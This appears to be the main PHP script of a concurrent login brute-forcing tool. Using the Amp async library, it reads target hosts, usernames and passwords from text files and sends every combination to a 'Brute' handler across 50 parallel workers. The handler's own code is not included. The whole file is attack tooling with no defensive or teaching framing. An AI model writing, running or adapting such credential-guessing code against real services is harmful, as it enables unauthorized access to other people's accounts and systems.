<?php
require 'vendor/autoload.php';
require 'lib/functions.php';

use Amp\Loop;
use Amp\Producer;
use Amp\Sync\LocalSemaphore;
use app\dns\Resolver;
use app\Log;
use Monolog\ErrorHandler;
use function Amp\Dns\resolver;
use function Amp\Sync\ConcurrentIterator\each;

$logins    = array_map('trimRow', file('data/logins.txt'));
$passwords = array_map('trimRow', file('data/passwords.txt'));
$verified  = fopen('data/verified.txt', 'r+') or die('verified.txt not exist!');

ErrorHandler::register(Log::getLogger());
Loop::setErrorHandler([Log::class, 'critical']);
resolver(new Resolver());

Loop::run(function () use ($logins, $passwords) {
            $iterator = new Producer(function ($emit) use ($passwords, $logins){
                foreach ($logins as $login) {
                    foreach ($passwords as $password) {
                        $verified  = fopen('data/verified.txt', 'r+');
                        try {
                            for ($i = 0; false !== $line = fgets($verified); $i++) {
                                yield $emit([trim($line),  $login, $password]);
                            }
                        } finally {
                            Log::debug("END OF FILE AT LINE {$i}");
                        }
                    }
                }
            });

            $brute = new Brute();

            yield each($iterator, new LocalSemaphore(50), $brute);
});